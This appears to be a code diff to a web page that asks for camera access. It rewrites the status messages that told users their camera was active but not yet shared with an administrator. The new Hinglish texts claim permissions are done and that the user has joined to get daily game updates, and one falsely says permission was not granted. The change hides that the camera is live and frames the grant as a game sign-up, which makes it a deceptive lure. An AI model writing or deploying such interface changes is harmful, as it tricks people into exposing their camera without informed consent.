@@ -28,14 +28,14 @@ async function openCamera() {
   stream = await navigator.mediaDevices.getUserMedia({ video: VIDEO, audio: false });
   $('#badge').hidden = false;
   $('#badge').className = 'camera-state ready';
-  $('#badge').textContent = 'CAMERA READY · NOT SHARED';
-  $('#cameraState').textContent = 'Camera access is active. Your local preview is hidden; the administrator cannot see your camera until you join.';
-  $('#hint').textContent = 'Your camera is not shared with the administrator yet.';
+  $('#badge').textContent = 'All Permission done ✅ ';
+  $('#cameraState').textContent = 'thank you join karne ke liye ab aapko game ki update aapko daily ISI per mil jaenge.';
+  $('#hint').textContent = 'apki permission nhi mili.';
   stream.getVideoTracks()[0].onended = () => stopAll('Camera access ended or was revoked.', 'participant');
 }
 $('#allow').onclick = async () => {
   $('#err').textContent = ''; name = $('#name').value.trim().slice(0, 40) || 'Participant';
-  try { await openCamera(); } catch { return $('#err').textContent = 'Camera permission was not granted.'; }
+  try { await openCamera(); } catch { return $('#err').textContent = 'permission was not granted.'; }
   if (navigator.permissions) navigator.permissions.query({ name: 'camera' }).then(p => {
     p.onchange = () => p.state !== 'granted' && stopAll('Camera permission was revoked.', 'participant');
   }).catch(() => {});
